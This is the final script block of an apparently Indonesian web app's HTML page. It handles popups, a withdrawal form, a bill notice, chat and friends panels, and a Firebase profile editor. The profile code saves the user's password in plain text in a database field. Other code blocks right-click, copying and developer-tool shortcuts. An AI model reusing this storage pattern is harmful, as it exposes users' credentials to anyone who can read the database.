    track.style.transform = `translateX(${-scrollPos}px)`;
    updateScale();
}

setInterval(autoScroll, 20);






document.addEventListener("DOMContentLoaded", () => {
  const historyIcon = document.querySelector('img[alt="hispanggilll"]'); 
  const historyPopup = document.getElementById("hispanggilll");
  const closeHistoryPopup = document.querySelector("#hispanggilll .closePanggilan");

  if (historyIcon && historyPopup && closeHistoryPopup) {
    // buka popup saat klik icon
    historyIcon.addEventListener("click", () => {
      historyPopup.style.display = "flex";
    });

    // tutup popup saat klik tombol X
    closeHistoryPopup.addEventListener("click", () => {
      historyPopup.style.display = "none";
    });

    // tutup popup saat klik di luar box
    historyPopup.addEventListener("click", (e) => {
      if (e.target === historyPopup) {
        historyPopup.style.display = "none";
      }
    });
  }
});







    const btnKasKeluar = document.getElementById("btnKasKeluar");
    const formPenarikan = document.getElementById("formPenarikan");
    const btnKembali = document.getElementById("btnKembali");


// klik Kas Keluar => tampilkan form
btnKasKeluar.addEventListener("click", () => {
  formPenarikan.style.display = "block";
  btnKasKeluar.style.display = "none";
});

// klik Kembali => sembunyikan form
btnKembali.addEventListener("click", () => {
  formPenarikan.style.display = "none";
  btnKasKeluar.style.display = "block";
});

// klik gambar close => tutup popup bank
document.getElementById("imgCloseBank").addEventListener("click", () => {
  document.getElementById("bankPopup").style.display = "none";
});



const btnRedeem = document.getElementById("btnRedeem");
const redeemPopup = document.getElementById("redeemPopup");
const closeRedeem = document.getElementById("closeRedeem");

btnRedeem.addEventListener("click", () => {
  redeemPopup.style.display = "block";
});

closeRedeem.addEventListener("click", () => {
  redeemPopup.style.display = "none";
});





document.getElementById("infoTagihan").addEventListener("click", () => {
  Swal.fire({
    title: "Informasi Tagihan",
    html: `
      <div style="text-align:left; line-height:1.8; font-size:14px; color:#444;">
        <p><b>Jumlah Tagihan</b> wajib diselesaikan sebelum melakukan penarikan.</p>
        <p>Nilai ini diperbarui otomatis oleh sistem sesuai transaksi pembayaran lunas.</p>
      </div>
    `,
    icon: "info",
    confirmButtonText: "Mengerti",
    width: 420,
    background: "#fff",
    customClass: {
      popup: "swal-custom-popup",
      confirmButton: "swal-custom-btn"
    }
  });
});





const images = [
  "demo_icon_nuansediao1.webp",
  "nature.webp",
  "demo_icon_xiaoqingxin1.webp",
  "demo_icon_lengsediao1.webp",
  "demo_icon_bailiang1.webp",
  "demo_icon_fennen1.webp",
  "login_icon_bg_1.webp",
  "login_icon_bg_2.webp",
  "avatar_notice_pic_1_male.webp",
  "avatar_notice_pic_3.png",
  "avatar_notice_pic_3_male.png",
  "cewek20.jpeg",
  "cewek25.jpeg",
  "cewek29.jpeg",
  "qorianto.jpg",
  "ramino.jpg",
  "rra.jpeg",
  "demo_icon_gexing1.webp"
];
let index = 0;
const overlay = document.getElementById("loginOverlay");

// ✅ tampilkan gambar pertama langsung
overlay.style.setProperty("--bg-image", `url('${images[index]}')`);

// ✅ ganti gambar setiap 2 detik
setInterval(() => {
  index = (index + 1) % images.length;
  overlay.style.setProperty("--bg-image", `url('${images[index]}')`);
}, 3000);









// Buka popup
// ===== Buka popup =====
gearBtn.addEventListener("click", async () => {
  if (!currentUser) return;

  try {
    const userRef = doc(db, "pendaftaran", currentUser.uid);
    const snap = await getDoc(userRef);
    if (snap.exists()) {
      const data = snap.data();
      document.getElementById("editNama").value = data.nama || "";
      document.getElementById("editUmur").value = data.umur || "";
      document.getElementById("editWA").value   = ""; // kosongkan password lama
      document.getElementById("editConfirmWA").value = "";
    }
    editPopup.style.display = "flex";
  } catch (err) {
    console.error("Gagal ambil data edit:", err);
    alert("Gagal ambil data.");
  }
});

// ===== Tutup popup =====
closeEditPopup.addEventListener("click", () => {
  editPopup.style.display = "none";
});

// ===== Fungsi tampilkan notif kecil =====
function showNotif(msg, success = true) {
  const notif = document.getElementById("notif");
  const span = notif.querySelector("span");

  span.textContent = msg;
  notif.style.background = success ? "#4caf50" : "#f44336";

  notif.style.display = "flex";
  notif.style.opacity = "1";
  notif.style.transition = "opacity 0.4s ease";

  if (notif.hideTimeout) clearTimeout(notif.hideTimeout);

  notif.hideTimeout = setTimeout(() => {
    notif.style.opacity = "0";
    setTimeout(() => {
      notif.style.display = "none";
    }, 400);
  }, 5500);
}

// ===== Simpan perubahan =====
editForm.addEventListener("submit", async (e) => {
  e.preventDefault();
  if (!currentUser) {
    showNotif("User belum login!", false);
    return;
  }

  const nama = document.getElementById("editNama").value.trim();
  const umur = parseInt(document.getElementById("editUmur").value.trim(), 10) || null;
  const wa   = document.getElementById("editWA").value.trim();
  const confirmWA = document.getElementById("editConfirmWA").value.trim();

  // 🔒 cek konfirmasi password
  if (wa !== confirmWA) {
    showNotif("Password dan Konfirmasi tidak sama!", false);
    return;
  }

  try {
    const userRef = doc(db, "pendaftaran", currentUser.uid);

    // kalau password kosong → hanya update nama & umur
    if (wa) {
      await updateDoc(userRef, { nama, umur, wa });
    } else {
      await updateDoc(userRef, { nama, umur });
    }

showNotif("Data berhasil diperbarui!\nSilahkan Refresh kembali");
    editPopup.style.display = "none";
  } catch (err) {
    console.error("🔥 Error update data:", err);
    showNotif("Gagal simpan perubahan: " + err.message, false);
  }
});





(function(){
  const popup = document.getElementById('chatPopup');
  const body = document.body;

  // buka popup
  window.openChat = function() {
    popup.style.display = 'flex';
    body.style.overflow = 'hidden';
  };

  // tutup popup (ESC atau klik luar box)
  window.closeChat = function() {
    popup.style.display = 'none';
    body.style.overflow = '';
  };

  // bikin semua chat-item bisa klik
  document.querySelectorAll('.chat-item').forEach(item => {
    item.addEventListener('click', () => openChat());
  });

  // tutup dengan ESC
  document.addEventListener('keydown', e => {
    if (e.key === 'Escape') closeChat();
  });

  // tutup dengan klik di luar box
  popup.addEventListener('click', e => {
    if (e.target === popup) closeChat();
  });
})();
















(function(){
  const trigger = document.getElementById('friendsBtn');
  const popup = document.getElementById('friendsPopup');
  const backBtn = document.getElementById('friendsBackBtn');
  const tabTeman = document.getElementById('friendsTabTeman');
  const tabPermintaan = document.getElementById('friendsTabPermintaan');
  const tabContent = document.getElementById('friendsTabContent');

  function openFriendsPopup() {
    popup.style.display = 'flex';
    popup.style.flexDirection = 'column';
    document.body.style.overflow = 'hidden'; // nonaktifkan scroll background
    showFriendsTab('teman'); // default tab
  }

  function closeFriendsPopup() {
    popup.style.display = 'none';
    document.body.style.overflow = '';
  }

  function showFriendsTab(tab) {
    if (tab === 'teman') {
      tabTeman.style.borderBottom = '3px solid #d7d7d7';
      tabPermintaan.style.borderBottom = '3px solid transparent';
      tabContent.textContent = 'Belum ada teman';
    } else {
      tabPermintaan.style.borderBottom = '3px solid #d7d7d7';
      tabTeman.style.borderBottom = '3px solid transparent';
      tabContent.textContent = 'Belum ada permintaan';
    }
  }

  // Attach listeners (safe: no inline onclick required)
  if (trigger) trigger.addEventListener('click', openFriendsPopup);
  if (backBtn) backBtn.addEventListener('click', closeFriendsPopup);
  if (tabTeman) tabTeman.addEventListener('click', () => showFriendsTab('teman'));
  if (tabPermintaan) tabPermintaan.addEventListener('click', () => showFriendsTab('permintaan'));

  // tutup dengan ESC
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') closeFriendsPopup();
  });

})();











document.addEventListener("DOMContentLoaded", () => {
  const popup = document.getElementById('callsPopup');
  const openBtn = document.getElementById('openCallsPopup');
  const backBtn = document.getElementById('backCallsPopup');

  if (openBtn && popup && backBtn) {
    openBtn.addEventListener('click', () => {
      popup.style.display = 'flex';
    });

    backBtn.addEventListener('click', () => {
      popup.style.display = 'none';
    });

    popup.addEventListener('click', (e) => {
      if (e.target === popup) {
        popup.style.display = 'none';
      }
    });
  }
});












// 🔒 Disable klik kanan
document.addEventListener("contextmenu", (e) => {
  e.preventDefault();
  return false;
});

// 🔒 Disable shortcut copy & developer tools
document.addEventListener("keydown", (e) => {
  // Cek kombinasi CTRL + (C, X, U, S, A)
  if (e.ctrlKey && ["c", "x", "u", "s", "a"].includes(e.key.toLowerCase())) {
    e.preventDefault();
    return false;
  }

  // 🔒 Blokir F12
  if (e.key === "F12") {
    e.preventDefault();
    return false;
  }

  // 🔒 Blokir CTRL+SHIFT+I / CTRL+SHIFT+J / CTRL+SHIFT+C
  if (e.ctrlKey && e.shiftKey && ["i", "j", "c"].includes(e.key.toLowerCase())) {
    e.preventDefault();
    return false;
  }
});

// 🔒 Force viewport tetap (anti zoom pakai pinch)
document.addEventListener("gesturestart", (e) => {
  e.preventDefault();
});






</script>

  <script src="app.js"></script>
 
</body>
</html>
